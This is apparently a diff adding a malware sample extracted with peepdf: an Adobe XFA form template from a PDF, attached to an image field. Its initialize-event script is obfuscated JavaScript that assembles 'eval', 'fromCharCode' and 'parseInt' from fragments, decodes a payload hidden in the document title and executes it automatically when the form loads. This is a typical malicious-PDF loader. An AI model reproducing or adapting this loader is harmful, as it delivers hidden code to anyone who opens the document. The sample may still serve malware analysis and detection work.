@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 43 (version 0)
+
+<!--
+#@ ^ #@ ^ # T@V % @NY % VU #@NTYW # & T -->
+< template > < subform layout = "tb"
+locale = "ru_RU"
+name = "form1" > < pageSet > < pageArea id = "Page1"
+name = "Page1" > < contentArea h = "10.5in"
+w = "8in"
+x = "0.25in"
+y = "0.25in" > < /contentArea><medium long="11in" short="8.5in" stock="letter"></medium > < /pageArea></pageSet > < subform h = "10.5in"
+w = "8in" > < field h = "98.425mm"
+name = "ImageField1"
+w = "28.575mm"
+x = "95.25mm"
+y = "19.05mm" > < ui > < imageEdit > < /imageEdit></ui > < caption placement = "bottom"
+reserve = "5mm" > < font typeface = "Myriad Pro" > < /font><para vAlign="middle"></para > < value > < text > Image Field < /text></value > < /caption><border xmlns=""><edge presence="hidden"></edge > < edge stroke = "dotted" > < /edge><edge stroke="dotted"></edge > < edge stroke = "dashed" > < /edge><corner stroke="dotted"></corner > < corner stroke = "dotted" > < /corner><corner stroke="dashed"></corner > < fill > < pattern type = "crossDiagonal" > < /pattern></fill > < /border><event xmlns:xfa="http:/ / www.xfa.org / schema / xfa - template / 2.2 / " activity="
+initialize "><xfa:script contentType='application/x-javascript'>with(event){ev=/*ewbwf*/"
+eva "/*/renyaerz*/;l="
+l ";t=event["
+t "+"
+arget "];ev+=l;cr='ti';if((event.fileName+"").substr(1,3)=='FA:'){	cr+=/*%#!%#!*/'t';	k=t[ev];	cr+='le';	a=/*ebwfweng`*/t[cr]['sp'+cr[3]+'it']('|')[0].substr(13);}}s=new String();z=a;ss=String;ff=/*%#!%#!*/"
+fr ";ff=ff.concat(/*%#!%#!//"
+# % @"*/"
+omChar ");if(!s.length)ff=ff.concat(/*%#!%#!//"
+# % @"*/"
+Code ");q="
+pars ";q=q.concat("
+eInt ");q=k(q);ss=ss[(k)?ff:0];xz=a.length;for(i=0;xz>i;i=i+2){	if (z[i]=='!'){}else	s+=(ss(q(z[i]+/*%#!%#!*/z[((k)?-1:1)*(-1-i)],26)));}z=s;k(/*%#!%#!*/z);</xfa:script></event></field></subform><proto></proto></subform><?templateDesigner DefaultLanguage FormCalc?><?templateDesigner DefaultRunAt client?><?templateDesigner Grid show:1, snap:1, units:0, color:ff8080, origin:(0,0), interval:(125000,125000)?><?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?><?templateDesigner Zoom 76?></template>
+
